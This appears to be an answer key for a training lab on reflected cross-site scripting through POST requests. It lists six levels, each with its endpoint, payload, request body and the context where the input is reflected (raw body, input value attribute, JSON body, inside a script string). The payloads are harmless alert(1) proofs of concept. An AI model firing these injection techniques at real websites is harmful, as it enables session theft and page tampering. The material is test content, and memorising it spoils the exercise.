# postmethod — solutions

POST method reflection variants (form, JSON, value attr, script string).

### postmethod-level1

`[POST] /postmethod/level1/`

- payload: `<script>alert(1)</script>`
- body: `query=<script>alert(1)</script>`
- context: raw body reflection

### postmethod-level2

`[POST] /postmethod/level2/`

- payload: `" onfocus=alert(1) autofocus x="`
- body: `query=" onfocus=alert(1) autofocus x="`
- context: reflected in <input value="QUERY"> attribute breakout

### postmethod-level3

`[POST] /postmethod/level3/`

- payload: `<script>alert(1)</script>`
- body: `{"query":"<script>alert(1)</script>"}` (Content-Type: application/json)
- context: JSON body reflected raw

### postmethod-level4

`[POST] /postmethod/level4/`

- payload: `</script><script>alert(1)</script>`
- body: `query=</script><script>alert(1)</script>`
- context: inside <script>var x="QUERY"; close script tag

### postmethod-level5

`[POST] /postmethod/level5/`

- payload: `<script>alert(1)</script>`
- body: `name=<script>alert(1)</script>`
- context: param named "name", raw reflection

### postmethod-level6

`[POST] /postmethod/level6/`

- payload: `" onfocus=alert(1) autofocus x="`
- body: `query=" onfocus=alert(1) autofocus x="`
- context: < > stripped, reflected in input value; attribute breakout
